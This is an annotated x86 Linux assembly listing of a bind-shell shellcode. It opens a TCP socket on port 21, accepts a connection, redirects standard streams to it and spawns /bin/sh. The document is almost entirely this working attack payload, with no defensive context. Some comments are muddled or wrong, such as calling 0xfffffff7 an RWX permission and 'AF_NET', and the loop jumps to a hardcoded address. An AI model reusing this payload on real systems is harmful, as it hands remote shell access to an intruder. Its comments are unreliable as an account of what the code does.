xor    ebx,ebx		; zero out ebx
mul    ebx			; zero out eax, and edx
push   ebx			; set IPPROTO_IP to (0x0)
inc    ebx			; increment ebx to 0x1 
push   ebx			; set socket_type to SOCK_STREAM (0x1)
push   0x2			; set socket_family to AF_INET (0x2)
mov    ecx, esp	; set ecx to sock args
mov    al, 0x66	; set sys_socketcall (0x66)
int    0x80			; exec sys_socketcall(AF_NET(0x2), SOCK_STREAM(0x1))
pop    ebx			; pops AF_NET(0x2) into ebx
pop    esi			; pops SOCK_STREAM(0x1) into esi
push   edx			; saves AF_NET(0x2)
push   0x15000002		; set sin_port:21
push   0x10			; set addrlen to 0x00000010
push   ecx			; saves (AF_NET(0x2), SOCK_STREAM(0x1))
push   eax			; saves sockfd(0x3)
mov    ecx,esp		; moves sockfd(AF_NET(0x2), SOCK_STREAM(0x1), sin_port(21))
push   0x66			 
pop    eax			; pops sys_socketcall (0x66) into eax
int    0x80			; exec sys_socketcall(sockfd(AF_NET(0x2), SOCK_STREAM(0x1), sin_port(21)))
mov    DWORD PTR [ecx+0x4],eax  ; replaces 0x15000002, with 0x3
mov    bl, 0x4    ; sys_listen (0x4)
mov    al,0x66			 
int    0x80			; set socket to listen(int sockfd, int backlog)
inc    ebx			; sys_accept (0x5)
mov    al,0x66			 
int    0x80			; set socket to accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
xchg   ebx,eax			; xchg(sys_accept(0x5), 0xffffffda (ENOSYS))  ENOSYS message (The TCP/IP stack is a pure IPv4 TCP/IP stack)
pop    ecx			; set counter == 0x3
push   0x3f			; sys_dup2()
pop    eax			; pops sys_dup2 into eax
int    0x80			; exec sys_dup2(sockfd)
dec    ecx			; controlling loop
jns    0x40408b   ; jmps if not sign (loops 3 times); exevcve("/bin/sh", NULL, NULL)
push   0x68732f2f	; push hs//
push   0x6e69622f	; push nib/
mov    ebx,esp		; moves hs//nib/ into ebx
push   eax			; pushes 0xfffffff7 = (RWX) permission for the shell
push   ebx			; pushes hs//nib/ 
mov    ecx,esp			; moves hs//nib/0xfffffff7 into ecx
mov    al,0xb			; sys_execve 
int    0x80			; executes sys_execve(hs//nib/0xfffffff7)
